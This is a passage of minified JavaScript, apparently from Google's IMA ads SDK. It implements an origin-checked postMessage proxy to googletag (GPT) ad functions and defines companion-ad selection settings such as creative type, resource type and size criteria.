      }
    }
  };
  function Ih() {
    return !!wa("googletag.cmd", window);
  }
  function Jh() {
    var a = wa("googletag.console", window);
    return null != a ? a : null;
  }
  var Kh = function () {
    Sf.call(this);
    this.g = null;
    this.l = new Fh("gpt", !0);
    tf(this, Ca(rf, this.l));
    Uf(this, this.l, "gpt", this.B);
    Ih() || window.top === window || (this.g = new Fh("gpt", !1), tf(this, Ca(rf, this.g)), Uf(this, this.g, "gpt", this.s));
  };
  w(Kh, Sf);
  Kh.prototype.B = function (a) {
    var b = a.origin,
      c = "//imasdk.googleapis.com".match(Gc);
    b = b.match(Gc);
    if (c[3] == b[3] && c[4] == b[4]) if (null != this.g) Hh(this.g, a.g, a.ga, window.parent), null != this.g && Gh(this.g, a);else if (c = a.ca, null != c && void 0 !== c.scope) {
      b = c.scope;
      c = c.args;
      var d;
      if ("proxy" === b) {
        var e = a.messageType;
        "isGptPresent" === e ? d = Ih() : "isConsolePresent" === e && (d = null != Jh());
      } else if (Ih()) if ("pubads" === b || "companionAds" === b) {
        d = a.messageType;
        var f = window.googletag;
        if (null != f && null != f[b] && (b = f[b](), null != b && (d = b[d], null != d))) try {
          e = d.apply(b, c);
        } catch (g) {}
        d = e;
      } else if ("console" === b) {
        if (e = Jh(), null != e && (b = e[a.messageType], null != b)) try {
          b.apply(e, c);
        } catch (g) {}
      } else null === b && (e = a.messageType, "googleGetCompanionAdSlots" === e ? (e = Bh()) ? (e = e.getSlots().map(Ch), d = e.length ? e : null) : d = null : ("googleSetCompanionAdContents" === e && Dh(null == c ? void 0 : c[0]), d = null));
      void 0 !== d && (a.ca.returnValue = d, Gh(this.l, a));
    }
  };
  Kh.prototype.s = function (a) {
    Gh(this.l, a);
  };
  var Lh = window,
    Mh = wa("google.ima.gptProxyInstance", Lh);
  null == Mh && (Mh = new Kh(), va("google.ima.gptProxyInstance", Mh, Lh));
  va("module$exports$google3$javascript$ads$interactivemedia$sdk$clientside$api$companion_ad_selection_settings.CompanionAdSelectionSettings.CreativeType", {
    IMAGE: "Image",
    FLASH: "Flash",
    ALL: "All"
  });
  va("module$exports$google3$javascript$ads$interactivemedia$sdk$clientside$api$companion_ad_selection_settings.CompanionAdSelectionSettings.ResourceType", {
    HTML: "Html",
    IFRAME: "IFrame",
    STATIC: "Static",
    ALL: "All"
  });
  va("module$exports$google3$javascript$ads$interactivemedia$sdk$clientside$api$companion_ad_selection_settings.CompanionAdSelectionSettings.SizeCriteria", {
    IGNORE: "IgnoreSize",
    SELECT_EXACT_MATCH: "SelectExactMatch",
    SELECT_NEAR_MATCH: "SelectNearMatch",
    SELECT_FLUID: "SelectFluid"
  });
})();